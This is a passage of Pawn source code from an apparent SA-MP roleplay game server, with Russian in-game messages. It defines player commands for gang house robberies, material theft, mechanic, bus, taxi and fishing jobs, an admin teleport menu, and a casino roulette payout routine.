						if(params[1] < 1 || params[1] > 100000) return SendClientMessage(playerid, COLOR_GREY, "Цена от 1 до 100000 доллара(ов)!");
						SendMes(playerid, COLOR_BLUE, "Вы предложили купить %s'у зону. Цена: %i долларов", sendername(params[0]), params[1]);
						SendMes(params[0], COLOR_BLUE, "%s предложил вам купить зону. Цена: %i долларов", PlayerInfo[playerid][pSendername], params[1]);
						format(totalstring, 128, "%s предложил вам купить зону. Цена: %i долларов\nВы согласны?", PlayerInfo[playerid][pSendername], params[1]);
						ShowPlayerDialog(params[0], D_JOB+13, 0, "Зона", totalstring, "Да", "Нет");
						SetPVarInt(params[0], "PlayerZone", playerid);
						SetPVarInt(params[0], "ZonePrice", params[1]);
						SetPVarInt(params[0], "ZoneID", i);
						full++;
					}
					else SendClientMessage(playerid, COLOR_GREY, "Игрок не руководитель банды!");
				}
			}
			if(full == 0) SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в гетто!");
		}
		else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:robhouse(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsAGang(playerid))
	{
		new full = 0, playerd;
		for(new i = 1; i <= TOTALHOUSE; i++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 3.0,HouseInfo[i][hEntrx],HouseInfo[i][hEntry],HouseInfo[i][hEntrz]))
			{
				full++;
				for(new p = 1;p<=TOTALGZ;p++)
				{
					if(PlayerToKvadrat(playerid,GZInfo[p][gCoords][0], GZInfo[p][gCoords][1],GZInfo[p][gCoords][2],GZInfo[p][gCoords][3]))
					{
						if(GZInfo[p][gFrak] != PlayerInfo[playerid][pMember]) return SendClientMessage(playerid, COLOR_GREY, "Грабить дома можно только на своей зоне!");
						if(!strcmp(HouseInfo[i][hOwner],"None",true)) return SendClientMessage(playerid, COLOR_GREY, "У дом нет владельца!");
						if(HouseInfo[i][hRob] == true) return SendClientMessage(playerid, COLOR_GREY, "Этот дом уже грабили в этом часу!");
						SendClientMessage(playerid, COLOR_LIGHTRED, "Вы ограбили дом на сумму 500 долларов");
						sscanf(HouseInfo[i][hOwner], "u", playerd);
						if(IsPlayerConnected(playerd)) SendClientMessage(playerd, COLOR_LIGHTRED, "Ваш дом был ограблен");
						if(HouseInfo[i][hOplata] > 500)
						{
							HouseInfo[i][hOplata] -= 500;
							SetHouseInt(i, "hOplata", HouseInfo[i][hOplata]);
						}
						else
						{
							HouseInfo[i][hOplata] = 0;
							SetHouseInt(i, "hOplata", 0);
						}
						HouseInfo[i][hRob] = true;
						if(PlayerInfo[playerid][pWanted] < 6)
						{
							PlayerInfo[playerid][pWanted]++;
							PlayerInfo[playerid][pWantedTime] = 1800 + random(300);
							SetPlayerWantedLevel(playerid,PlayerInfo[playerid][pWanted]);
							SetPlayerCriminal(playerid, "Неизвестный", "Ограбление");
						}
						GiveMoney(playerid, 500);
					}
				}
			}
		}
		if(full == 0) SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться рядом с домом!");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:robmats(playerid, params[])
{
	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы не в погрузчике вашей банды!");
	if(!PlayerToPoint(6.0, playerid, 331.3846,1963.8951,17.6406)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться около склада армии!");
	new vehid = GetPlayerVehicleID(playerid);
	if(GetPVarInt(playerid,"RobMatsCar") == vehid) return SendClientMessage(playerid, COLOR_GREY, "Вы уже воруете материалы!");
	if(GetVehicleModel(vehid) == 482)
	{
		if(GunKG[vehid] >= 2000) return SendClientMessage(playerid,-1,"В машине достаточно материалов!");
		SendMes(playerid, COLOR_WHITE, "Материалов в авто: {ffff00}%i{ffffff}", GunKG[vehid]);
		SendClientMessage(playerid, COLOR_GREY, "Вы начали загрузку материалов!");
		SetPVarInt(playerid,"RobMatsCar",vehid);
	}
	return true;
}
CMD:robzavod(playerid, params[])
{
	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы не в погрузчике вашей банды!");
	if(!PlayerToPoint(6.0, playerid, 2523.9641,2818.5845,10.8203)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться около склада завода!");
	new vehid = GetPlayerVehicleID(playerid);
	if(GetPVarInt(playerid,"RobMatsCar") == vehid) return SendClientMessage(playerid, COLOR_GREY, "Вы уже воруете материалы!");
	if(GetVehicleModel(vehid) == 482)
	{
		if(GunKG[vehid] >= 2000) return SendClientMessage(playerid,-1,"В машине достаточно материалов!");
		SendMes(playerid, COLOR_WHITE, "Материалов в авто: {ffff00}%i{ffffff}", GunKG[vehid]);
		SendClientMessage(playerid, COLOR_GREY, "Вы начали загрузку материалов!");
		SetPVarInt(playerid,"RobZavodCar",vehid);
	}
	return true;
}
CMD:repair(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pJob] == J_MECHANIC)
	{
		if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем эвакуатора!");
		new carid = GetPlayerVehicleID(playerid);
		if(carid >= mechanic[0] && carid <= mechanic[1] || GetVehicleModel(carid) == 525)
		{
			if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /repair [id игрока] [цена]");
			if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
			if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
			if(params[1] < 1 || params[1] > 1000) return SendClientMessage(playerid, COLOR_GREY, "Цена от 1 до 1000 долларов!");
			if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
			if(GetPlayerState(params[0]) != 2) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться за рулем транспорта!");
			if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь починить машину себе!");
			SendMes(playerid, COLOR_LIGHTBLUE, "Вы предложили %s'у починить его транспорт за %i долларов", sendername(params[0]), params[1]);
			SendMes(params[0], COLOR_LIGHTBLUE, "%s преложил вам починить ваш транспорт за %i долларов", PlayerInfo[playerid][pSendername], params[1]);
			format(totalstring, 200, "%s преложил вам починить ваш транспорт за %i долларов\n\nВы согласны?", PlayerInfo[playerid][pSendername], params[1]);
			ShowPlayerDialog(params[0], D_JOB+67, 0, "Автомеханик", totalstring, "Да", "Нет");
			SetPVarInt(playerid, "MechVehID", GetPlayerVehicleID(params[0]));
			SetPVarInt(params[0], "PlayerMech", playerid);
			SetPVarInt(params[0], "MechanicPrice", params[1]);
		}
		else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в эвакуаторе!");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:refill(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pJob] == J_MECHANIC)
	{
		if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем эвакуатора!");
		new carid = GetPlayerVehicleID(playerid);
		if(carid >= mechanic[0] && carid <= mechanic[1] || GetVehicleModel(carid) == 525)
		{
			if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /refill [id игрока] [цена]");
			if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
			if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
			if(params[1] < 1 || params[1] > 5000) return SendClientMessage(playerid, COLOR_GREY, "Цена от 1 до 5000 долларов!");
			if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
			if(GetPlayerState(params[0]) != 2) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться за рулем транспорта!");
			if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь заправить себе машин!");
			SendMes(playerid, COLOR_LIGHTBLUE, "Вы предложили %s'у заправить его транспорт за %i долларов", sendername(params[0]), params[1]);
			SendMes(params[0], COLOR_LIGHTBLUE, "%s преложил вам заправить ваш транспорт за %i долларов", PlayerInfo[playerid][pSendername], params[1]);
			format(totalstring, 200, "%s преложил вам заправить ваш транспорт за %i долларов\n\nВы согласны?", PlayerInfo[playerid][pSendername], params[1]);
			ShowPlayerDialog(params[0], D_JOB+130, 0, "Автомеханик", totalstring, "Да", "Нет");
			SetPVarInt(params[0], "MechanicPlayer", playerid);
			SetPVarInt(params[0], "MechanicPrice", params[1]);
		}
		else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в эвакуаторе!");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:route(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pJob] != J_BUS) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем автобуса!");
	new carid = GetPlayerVehicleID(playerid);
	if(carid >= buscar[0] && carid <= buscar[1])
	{
		if(GetPVarInt(playerid, "PriceBus") > 0)
		{
			SendMes(playerid, COLOR_BLUE, "Рабочий день завершен. Вами заработано: %i долларов", GetPVarInt(playerid, "BusMoney"));
			SendClientMessage(playerid, COLOR_WHITE, "Деньги будут перечислены на счет во время зарплаты");
			PlayerInfo[playerid][pPayCheck] += GetPVarInt(playerid, "BusMoney");
			DeletePVar(playerid, "BusTime");
			DeletePVar(playerid, "TypeBus");
			DeletePVar(playerid, "PriceBus");
			DeletePVar(playerid, "BusStop");
			DeletePVar(playerid, "BusMoney");
			pPressed[playerid] = 0;
			Delete3DTextLabel(BusText3D[playerid]);
			SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			DisablePlayerRaceCheckpoint(playerid);
			return true;
		}
		ShowPlayerDialog(playerid, D_JOB+55, 1, "Проезд", "Введите стоимость проезда:", "Принять", "Отмена");
	}
	else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в автобусе!");
	return true;
}

CMD:fare(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pJob] != J_TAXI) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем такси!");
	new carid = GetPlayerVehicleID(playerid);
	if(carid >= taxicar[0] && carid <= taxicar[1])
	{
		if(GetPVarInt(playerid, "PriceTaxi") > 0)
		{
			SendMes(playerid, COLOR_BLUE, "Рабочий день завершен. Вами заработано: %i долларов", GetPVarInt(playerid, "TaxiMoney"));
			SendClientMessage(playerid, COLOR_WHITE, "Деньги будут перечислены на счет во время зарплаты");
			DeletePVar(playerid, "PriceTaxi");
			DeletePVar(playerid, "TaxiMoney");
			Delete3DTextLabel(TaxiText3D[playerid]);
			return true;
		}
		ShowPlayerDialog(playerid, D_JOB+57, 1, "Тариф", "Введите стоимость проезда:", "Принять", "Отмена");
	}
	else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в такси!");
	return true;
}

CMD:fish(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_GREY, "Функция доступна с 3 уровня!");
	if(VaildFishPlace(playerid) && !IsPlayerInAnyVehicle(playerid))
	{
		if(GetPVarInt(playerid, "Fishing") > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы уже рыбачите!");
		TogglePlayerControllable(playerid, 0);
		ApplyAnimation(playerid,"SWORD","sword_block",50.0,0,1,0,1,1);
		new randfish = 10 + random(19);
		SetPVarInt(playerid, "FishingTime", randfish);
		GameTextForPlayer(playerid,"~g~Waiting....", randfish*1000, 6);
		new object = SetPlayerAttachedObject(playerid, 0,18632,6,0.079376,0.037070,0.007706,181.482910,0.000000,0.000000,1.000000,1.000000,1.000000);
		SetPVarInt(playerid, "FishingObject", object);
		SetPVarInt(playerid, "Fishing", 1);
	}
	else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться на пристани ЛС!");
	return true;
}
CMD:stopfish(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPVarInt(playerid, "Fishing") == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не рыбачите!");
	TogglePlayerControllable(playerid, 1);
	ApplyAnimation(playerid,"CARRY","crry_prtial",4.0,0,0,0,0,0);
	DeletePVar(playerid, "FishingTime");
	DeletePVar(playerid, "Fishing");
	RemovePlayerAttachedObject(playerid,0);
	RemovePlayerAttachedObject(playerid,GetPVarInt(playerid, "FishingObject"));
	DeletePVar(playerid, "FishingObject");
	SendClientMessage(playerid, COLOR_LIGHTRED, "Вы отменили процесс рыбалки");
	return true;
}
CMD:robbery(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(!IsAMafia(playerid)) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	new nearest = GetPlayerVehicleID(playerid);
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится за рулем транспорта!");
	if(GetVehicleModel(nearest) != 482) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится в грузовике!");
	if(!IsPlayerInRangeOfPoint(playerid, 20.0, 356.6240,865.3132,20.5238)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится на складе в карьере!");
	if(ProductKG[nearest] >= 5000) return SendClientMessage(playerid, COLOR_GREY, "В этом грузовике нет места!");
	new Float:X, Float:Y, Float:Z;
	GetVehiclePos(nearest, X, Y, Z);
	GetXYInFrontOfPlayer(playerid, X, Y, -3.0);
	MatsPickup[nearest] = CreatePickup(19197,23,X,Y,Z);
	format(totalstring, 50, "Загруженно\n{ffff00}%d / 5000{ffffff} кг",ProductKG[nearest]);
	MatsText[nearest] = Create3DTextLabel(totalstring,0xffffffff,X,Y,Z+0.7,50.0,0,1);
	GetVehicleParamsEx(nearest,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(nearest,VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot, objective);
	Boot[GetPlayerVehicleID(playerid)] = true;
	Lights[GetPlayerVehicleID(playerid)] = false;
	if(Engine[GetPlayerVehicleID(playerid)] == true)
	{
		format(totalstring, 64, "%s заглушил двигатель", PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,totalstring);
		Engine[GetPlayerVehicleID(playerid)] = false;
	}
	RemoveFromVehicle(playerid);
	Robbery[nearest] = true;
	return true;
}
CMD:tp(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false) return true;
	ShowPlayerDialog(playerid, D_JOB+139, 2, "Телепорт", "Автовокзал ЛС\nАвтовокзал ЛС (Крыша)\nАвтовокзал СФ (Крыша)\nАвтошкола\nГетто\nМэрия\nБанк\nЗона 51\nАвианосец\nАвтопарк\nЛСПД\nСФПД\nФБР\nЛКН\nЯкудза\nРусская мафия\nКарьер\nФерма\nНубо Респа\nШахта\nЗавод К.А.С.С.\nГрузчик LV", "Принять","Отмена");
	return true;
}
//==============================================================================
forward RuletCheck2();
public RuletCheck2() // Казино
{
	new WinNumber;
	new randnumber, timegametext;
	new Slotrulet1,string[8], strk2[64];
	if(RouletteRunned[1] == true)
	{
		foreach(new i:Player)
		{
			if(RouletteStart[i] == false) continue;
			if(UseRoulette[i] != 2) continue;
			if(!IsPlayerConnected(i)) continue;
			if(KrupieTime[1] <=50)
			{
				if(KrupieTime[1] < 40) randnumber = 1, timegametext = 100;
				else if(KrupieTime[1] < 45) randnumber = random(2), timegametext = 300;
				else randnumber = random(3), timegametext = 600;
				if(randnumber == 1)
				{
					WinNumber = 0 + random(36);
					KrupieTime[1]++;
					if(WinNumber == 0)
					{
						GameTextForPlayer(i, "~y~0", timegametext, 5);
					}
					else if (WinNumber ==2 || WinNumber ==4 || WinNumber ==6 || WinNumber ==8 || WinNumber ==10 || WinNumber ==11 || WinNumber ==13 || WinNumber ==15 || WinNumber ==17 || WinNumber ==20 || WinNumber ==22 || WinNumber ==24 || WinNumber ==26 || WinNumber ==28 || WinNumber ==29 || WinNumber ==31 || WinNumber ==33 || WinNumber ==35)
					{
						format(string, 7, "~r~%d",WinNumber);
						GameTextForPlayer(i, string, timegametext, 5);
					}
					else if (WinNumber ==1 || WinNumber ==3 || WinNumber ==5 || WinNumber ==7 || WinNumber ==9 || WinNumber ==12 || WinNumber ==14 || WinNumber ==16 || WinNumber ==18 || WinNumber ==19 || WinNumber ==21 || WinNumber ==23 || WinNumber ==25 || WinNumber ==27 || WinNumber ==30 || WinNumber ==32 || WinNumber ==34 || WinNumber ==36)
					{
						format(string, 7, "~w~%d",WinNumber);
						GameTextForPlayer(i, string, timegametext, 5);
					}
				}
			}
			else
			{
				WinNumber = 0 + random(36);
				RouletteRunned[1] = false;
				RouletteStart[i] =false;
				if (WinNumber == 0)
				{
					GameTextForPlayer(i, "0", 7000, 5);
				}
				else if (WinNumber ==1 || WinNumber ==3 || WinNumber ==5 || WinNumber ==7 || WinNumber ==9 || WinNumber ==12 || WinNumber ==14 || WinNumber ==16 || WinNumber ==18 || WinNumber ==19 || WinNumber ==21 || WinNumber ==23 || WinNumber ==25 || WinNumber ==27 || WinNumber ==30 || WinNumber ==32 || WinNumber ==34 || WinNumber ==36)
				{
					format(string, 7, "~r~%d",WinNumber);
					GameTextForPlayer(i, string, 7000, 5);

				}
				else if (WinNumber ==2 || WinNumber ==4 || WinNumber ==6 || WinNumber ==8 || WinNumber ==10 || WinNumber ==11 || WinNumber ==13 || WinNumber ==15 || WinNumber ==17 || WinNumber ==20 || WinNumber ==22 || WinNumber ==24 || WinNumber ==26 || WinNumber ==28 || WinNumber ==29 || WinNumber ==31 || WinNumber ==33 || WinNumber ==35)
				{
					format(string, 7, "~w~%d",WinNumber);
					GameTextForPlayer(i, string, 7000, 5);
				}
				if (WinNumber ==1 || WinNumber ==3 || WinNumber ==5 || WinNumber ==7 || WinNumber ==9 || WinNumber ==12 || WinNumber ==14 || WinNumber ==16 || WinNumber ==18 || WinNumber ==19 || WinNumber ==21 || WinNumber ==23 || WinNumber ==25 || WinNumber ==27 || WinNumber ==30 || WinNumber ==32 || WinNumber ==34 || WinNumber ==36)
				{
					Slotrulet1 = 1;
				}
				else if (WinNumber ==2 || WinNumber ==4 || WinNumber ==6 || WinNumber ==8 || WinNumber ==10 || WinNumber ==11 || WinNumber ==13 || WinNumber ==15 || WinNumber ==17 || WinNumber ==20 || WinNumber ==22 || WinNumber ==24 || WinNumber ==26 || WinNumber ==28 || WinNumber ==29 || WinNumber ==31 || WinNumber ==33 || WinNumber ==35)
				{
					Slotrulet1 = 2;
				}
				else
				{
					Slotrulet1 = 3;
				}
				RouletteRunned[1] = false;
				KrupieTime[1] = 0;
				RoulRunned[1] = true;
			}
		}
	}
	if(RoulRunned[1] == true)
	{
		for(new h=0;h<MAX_PLAYERS;h++)
		{
			if (UseRoulette[h] != 2) continue;
			if (RuletTip[h] <= 37 && RuletTip[h] >= 1)
			{
				RuletikProv[h] = RuletTip[h] - 1;
				if(RuletikProv[h] == WinNumber)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 20;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					format(strk2, 64, "Новости: id %d только что выиграл %d в казино!",h,RuletVidachaDen[h]);
					SendClientMessageToAll(COLOR_BLUE, strk2);
				}
				else
				{
					format(strk2, 32, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}
			}
			else if (RuletTip[h] == 38 || RuletTip[h] == 39)
			{
				if (Slotrulet1 == 1 && RuletTip[h]==38)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 2;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else if(Slotrulet1 == 2 && RuletTip[h]==39)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 2;

					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 32, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}
			}
			else if (RuletTip[h] == 40) // 1 proverka
			{
				if (WinNumber >=1 && WinNumber<=12)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 3;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 32, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}
			}
			else if (RuletTip[h] == 41) // 2 proverka
			{
				if (WinNumber >=13 && WinNumber<=24)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 3;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}
			}
			else if (RuletTip[h] == 42) // 3 proverka
			{
				if (WinNumber >=25 && WinNumber<=36)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 3;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;

				}
			}
			else if (RuletTip[h] == 43) // 4 proverka
			{
				if (WinNumber >=1 && WinNumber<=18)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 2;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;

				}
			}
			else if (RuletTip[h] == 44) // 5 proverka
			{
				if (WinNumber >=19 && WinNumber<=36)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 2;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;

				}
			}
			else if (RuletTip[h] == 45) // 6 proverka
			{
				if (WinNumber == 2 || WinNumber == 4 || WinNumber == 6 || WinNumber == 8 || WinNumber == 10 || WinNumber == 11 || WinNumber == 13 || WinNumber == 15 || WinNumber == 17 || WinNumber == 20 || WinNumber == 22 || WinNumber == 24 || WinNumber == 26 || WinNumber == 28 || WinNumber == 29 || WinNumber == 31 || WinNumber == 33 || WinNumber == 35)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 2;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}
			}
			else if (RuletTip[h] == 46) // 7 proverka
			{
				if (WinNumber == 1 || WinNumber == 3 || WinNumber == 5 || WinNumber == 7 || WinNumber == 9 || WinNumber == 12 || WinNumber == 14 || WinNumber == 16 || WinNumber == 18 || WinNumber == 19 || WinNumber == 21 || WinNumber == 23 || WinNumber == 25 || WinNumber == 27 || WinNumber == 30 || WinNumber == 32 || WinNumber == 34 || WinNumber == 36)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 2;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;

				}
			}
			else if (RuletTip[h] ==47)
			{
				new bool:resullit;
				switch(WinNumber)
				{
				case 3,6,9,12,15,18,21,24,27,30,33,36:
					{
						RuletVidachaDen[h] = RouletteSumm[h] * 3;
						GiveMoney(h,RuletVidachaDen[h]);
						format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
						SendClientMessage(h, COLOR_YELLOW, strk2);
						resullit =true;
					}
				}
				if (resullit==false)
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}

			}
			else if (RuletTip[h] ==48)
			{
				new bool:resullit;
				switch(WinNumber)
				{
				case 2,5,8,11,14,17,20,23,26,29,32,35:
					{
						RuletVidachaDen[h] = RouletteSumm[h] * 3;
						GiveMoney(h,RuletVidachaDen[h]);
						format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
						SendClientMessage(h, COLOR_YELLOW, strk2);
						resullit =true;
					}
				}
				if (resullit ==false)
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}

			}
			else if (RuletTip[h] ==49)
			{
				new bool:resullit;
				switch(WinNumber)
				{
				case 1,4,7,10,13,16,19,22,25,28,31,34:
					{
						RuletVidachaDen[h] = RouletteSumm[h] * 3;
						GiveMoney(h,RuletVidachaDen[h]);
						format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
						SendClientMessage(h, COLOR_YELLOW, strk2);
						resullit=true;
					}
				}
				if (resullit ==false)
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}
			}
			DestroyObject(Fishka[h]);
			PlayerPlaySound(h, 0, 0.0, 0.0, 0.0);
			Fishka[h] = CreateObject(1913,fishechkax[h],fishechkay[h],1006.0690,0.00,0.00,0.00);
			Upravakazino[h] = true;
			RuletTip[h] = 0;
			RouletteSumm[h] = 0;
			RouletteStart[h] = false;
		}
	}
	if (RoulRunned[1] == true)
	{
		RoulRunned[1] = false;
		format(strk2, 64, "* [2 СТОЛ] %s говорит: Выпало число: %d",PlayerInfo[CroupierN[1]][pSendername],WinNumber);
		ProxDetectorX(2242.1423,1619.3339,1007.1303,14.00,COLOR_PURPLE,strk2);
		Update3DTextLabelText(CasinoText[1], COLOR_ORANGE, "СТОЛ №2: {10d800}принимает ставки");
		WinNumber=0;
		KillTimer(RuletTimer2);
		if(PlayerInfo[CroupierN[1]][pPayCheck] <= 9000)
		{
			PlayerInfo[CroupierN[1]][pPayCheck] += 276;
		}
	}
	return true;
}
//==============================================================================
forward CancelCasino(playerid);
public CancelCasino(playerid)
{
	SendClientMessage(playerid, COLOR_YELLOW, "Спасибо за игру, приходите еще!");
	PlayerPlaySound(playerid, 0, 0.0, 0.0, 0.0);
	SetCameraBehindPlayer(playerid);
	TogglePlayerControllable(playerid, 1);
	Kazkamera[playerid] =0;
	UseRoulette[playerid] = 0;
	Upravakazino[playerid] = false;
	DestroyObject(Fishka[playerid]);
	if(RouletteStart[playerid] == true)
	{
		SendMes(playerid, COLOR_BLUE, "Вам вернули %d$, которые вы поставили!",RouletteSumm[playerid]);
		RuletTip[playerid] = 0;
